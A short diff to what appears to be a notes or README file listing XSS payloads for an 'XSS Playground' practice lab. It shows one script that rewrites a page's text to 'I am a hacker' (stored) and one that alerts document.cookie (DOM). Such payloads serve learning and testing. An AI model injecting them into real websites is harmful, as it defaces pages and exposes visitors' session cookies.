@@ -9,9 +9,10 @@ perfect xss payload stored and reflected and dom and some change in the page
 
 <code>
 <script>document.body.innerHTML = document.body.innerHTML.replace("XSS Playground", "I am a hacker");</script> to change the main web page text  (STORED)
+</code>
 
+  <code>
 
-  
 <script>alert(document.cookie);</script> to show your cookie (DOM)
 
 
